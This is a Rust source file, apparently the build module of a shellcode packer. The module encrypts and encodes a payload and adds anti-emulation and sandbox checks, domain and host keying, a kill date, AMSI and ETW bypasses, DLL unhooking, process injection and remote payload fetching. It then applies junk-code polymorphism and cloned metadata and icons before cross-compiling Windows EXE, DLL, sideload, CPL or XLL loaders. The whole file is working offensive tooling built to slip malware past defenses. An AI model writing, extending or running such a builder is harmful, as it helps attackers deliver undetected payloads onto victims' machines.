use std::path::{Path, PathBuf};
use rand::Rng;

use crate::codegen::{self, LoaderConfig};
use crate::encode::{self, EncodingType};
use crate::encrypt;
use crate::anti_emulation;
use crate::environmental;
use crate::payload_location;
use crate::polymorphism;
use crate::bypass;
use crate::injection::{self, InjectionMethod};
use crate::input::{self, InputFormat};
use crate::output::OutputFormat;

pub struct BuildConfig {
    pub input_file: PathBuf,
    pub output_file: PathBuf,
    pub input_format: InputFormat,
    pub output_format: OutputFormat,
    pub encoding: EncodingType,
    pub injection_method: InjectionMethod,

    // Payload location
    pub shellcode_file: Option<String>,
    pub reg_payload: Option<String>,
    pub shellcode_url: Option<String>,

    // Environmental
    pub sandbox: Option<String>,
    pub env_domain: Option<String>,
    pub env_host: Option<String>,
    pub kill_date: Option<String>,

    // Bypasses
    pub amsi_bypass: bool,
    pub etw_bypass: bool,
    pub unhook_dll: Option<String>,

    // Special
    pub interactive_ps: bool,
    pub icon_path: Option<PathBuf>,
    pub clone_metadata_path: Option<PathBuf>,
}

#[allow(dead_code)]
pub struct BuildResult {
    pub output_path: PathBuf,
    pub loader_source: String,
    pub temp_dir: PathBuf,
}

pub fn build(config: &BuildConfig) -> anyhow::Result<BuildResult> {
    let mut rng = rand::thread_rng();

    // 1. Read input payload
    let payload_bytes = input::shellcode::read_shellcode(&config.input_file)?;

    // 2. Encrypt
    let encrypted = encrypt::encrypt_aes256_cbc(&payload_bytes);

    // 3. Encode
    let encoded = encode::encode_payload(&encrypted.ciphertext, config.encoding);

    // 4. Generate environmental snippets
    let kill_date_snippet = if let Some(ref date) = config.kill_date {
        environmental::kill_date_check_snippet(date)?
    } else {
        // Default: 30 days from now
        let default_date = chrono::Utc::now()
            .checked_add_signed(chrono::Duration::days(30))
            .unwrap_or_else(chrono::Utc::now)
            .format("%Y-%m-%d")
            .to_string();
        environmental::kill_date_check_snippet(&default_date)?
    };

    let sandbox_snippet = config
        .sandbox
        .as_deref()
        .map(environmental::sandbox_check_snippet)
        .unwrap_or_default();

    let env_key_snippet = {
        let mut s = String::new();
        if let Some(ref domain) = config.env_domain {
            s.push_str(&environmental::domain_key_snippet(domain));
            s.push('\n');
        }
        if let Some(ref host) = config.env_host {
            s.push_str(&environmental::hostname_key_snippet(host));
        }
        s
    };

    // 5. Anti-emulation (random selection)
    let anti_emulation_snippet = anti_emulation::select_anti_emulation(&mut rng);

    // 6. Payload location snippet
    let payload_retrieval_snippet = if let Some(ref path) = config.shellcode_file {
        payload_location::payload_from_file_snippet(path)
    } else if let Some(ref key) = config.reg_payload {
        payload_location::payload_from_registry_snippet(key)
    } else if let Some(ref url) = config.shellcode_url {
        payload_location::payload_from_url_snippet(url)
    } else {
        // Embedded - payload is in the encoded_literal
        String::new()
    };

    // 7. Injection snippet
    let injection_snippet = injection::get_injection_snippet(&config.injection_method);

    // 8. Bypass snippets
    let unhook_snippet = config
        .unhook_dll
        .as_deref()
        .map(bypass::userland_hooks::unhook_dll_snippet)
        .unwrap_or_default();

    let amsi_snippet = if config.amsi_bypass {
        bypass::amsi::select_amsi_bypass(&mut rng)
    } else {
        String::new()
    };

    let etw_snippet = if config.etw_bypass {
        bypass::etw::select_etw_bypass(&mut rng)
    } else {
        String::new()
    };

    // 9. Assemble loader config
    let loader_cfg = LoaderConfig {
        anti_emulation: anti_emulation_snippet,
        kill_date: kill_date_snippet,
        sandbox_check: sandbox_snippet,
        env_key: env_key_snippet,
        unhook: unhook_snippet,
        amsi_bypass: amsi_snippet,
        etw_bypass: etw_snippet,
        payload_retrieval: payload_retrieval_snippet,
        decode: encoded.decode_snippet.clone(),
        decrypt: String::new(),
        injection: injection_snippet,
        encoded_payload: encoded.encoded_literal.clone(),
        decode_offset: 0,
        key_bytes: encrypt::format_key_literal(&encrypted.key),
        iv_bytes: encrypt::format_iv_literal(&encrypted.iv),
        use_dotnet: config.input_format == InputFormat::DotNet,
        use_pe: config.input_format == InputFormat::NativePE,
        interactive_ps: config.interactive_ps,
        use_syscalls: crate::injection::uses_syscalls(&config.injection_method),
        output_format: config.output_format.clone(),
    };

    // 10. Render loader source
    let mut loader_source = codegen::render_loader_source(&loader_cfg);

    // 11. Apply polymorphism
    loader_source = polymorphism::inject_junk(&loader_source, &mut rng);

    // 12. Write to temp directory and compile
    let temp_dir = std::env::temp_dir().join(format!("rustpack_{}", rng.gen::<u32>()));
    std::fs::create_dir_all(&temp_dir)?;
    std::fs::create_dir_all(temp_dir.join("src"))?;
    std::fs::create_dir_all(temp_dir.join(".cargo"))?;

    // Write .cargo/config.toml for cross-compilation
    std::fs::write(
        temp_dir.join(".cargo/config.toml"),
        "[target.x86_64-pc-windows-gnu]\nlinker = \"x86_64-w64-mingw32-gcc\"\n",
    )?;

    // Write Cargo.toml
    let cargo_toml = codegen::generate_loader_cargo_toml(&config.output_format, config.shellcode_url.is_some());
    std::fs::write(temp_dir.join("Cargo.toml"), &cargo_toml)?;

    // Write source file
    let src_filename = match config.output_format {
        OutputFormat::Dll | OutputFormat::Sideload { .. } | OutputFormat::Cpl | OutputFormat::Xll => {
            "src/lib.rs"
        }
        _ => "src/main.rs",
    };
    std::fs::write(temp_dir.join(src_filename), &loader_source)?;

    // 13. Handle metadata and icon
    if config.clone_metadata_path.is_some() || config.icon_path.is_some() {
        let metadata = if let Some(ref meta_path) = config.clone_metadata_path {
            crate::metadata::clone_metadata(meta_path)?
        } else {
            std::collections::HashMap::new()
        };
        let rc_content = crate::metadata::generate_rc_file(
            &metadata,
            config.icon_path.as_deref(),
        );
        std::fs::write(temp_dir.join("resource.rc"), &rc_content)?;
    }

    // 14. Build the loader
    compile_loader(&temp_dir, &config.output_format, &config.output_file)?;

    Ok(BuildResult {
        output_path: config.output_file.clone(),
        loader_source,
        temp_dir,
    })
}

fn compile_loader(
    project_dir: &Path,
    output_format: &OutputFormat,
    output_path: &Path,
) -> anyhow::Result<()> {
    let target = "x86_64-pc-windows-gnu";

    let mut cmd = std::process::Command::new("cargo");
    cmd.arg("build")
        .arg("--release")
        .arg("--target")
        .arg(target)
        .current_dir(project_dir);

    let output = cmd
        .output()
        .map_err(|e| anyhow::anyhow!("Failed to run cargo build: {}", e))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!("Cargo build failed:\n{}", stderr);
    }

    // Copy the built artifact to output path
    let artifact_name = match output_format {
        OutputFormat::Dll | OutputFormat::Sideload { .. } => "loader.dll",
        OutputFormat::Cpl => "loader.dll",
        OutputFormat::Xll => "loader.dll",
        _ => "loader.exe",
    };

    let built_path = project_dir
        .join("target")
        .join(target)
        .join("release")
        .join(artifact_name);

    if built_path.exists() {
        std::fs::copy(&built_path, output_path)
            .map_err(|e| anyhow::anyhow!("Failed to copy output: {}", e))?;
    } else {
        // Try without target triple
        let alt_path = project_dir
            .join("target")
            .join("release")
            .join(artifact_name);
        if alt_path.exists() {
            std::fs::copy(&alt_path, output_path)
                .map_err(|e| anyhow::anyhow!("Failed to copy output: {}", e))?;
        } else {
            anyhow::bail!(
                "Build artifact not found at {} or {}",
                built_path.display(),
                alt_path.display()
            );
        }
    }

    Ok(())
}
